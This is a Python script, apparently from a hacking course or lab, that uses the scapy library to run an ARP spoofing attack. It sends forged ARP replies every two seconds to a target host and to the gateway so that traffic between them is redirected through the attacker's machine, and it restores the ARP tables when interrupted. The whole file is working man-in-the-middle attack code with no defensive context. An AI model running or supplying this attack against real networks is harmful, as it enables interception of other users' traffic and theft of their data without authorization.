#!usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_MAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_IP, spoof_IP):
    target_MAC = get_MAC(target_IP)
    packet = scapy.ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=spoof_IP)
    scapy.send(packet, verbose=False)

def restore(destination_IP, source_IP):
    destination_MAC = get_MAC(destination_IP)
    source_MAC = get_MAC(source_IP)
    packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC)
    scapy.send(packet, count=4, verbose=False)


target_IP = "10.0.2.7"
gateway_IP ="10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_IP, gateway_IP)
        spoof(gateway_IP, target_IP)
        sent_packets_count = sent_packets_count + 2
        print("\rPackets Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected Quit Command, Resetting ARP tables!")
    restore(target_IP, gateway_IP)
    restore(gateway_IP, target_IP)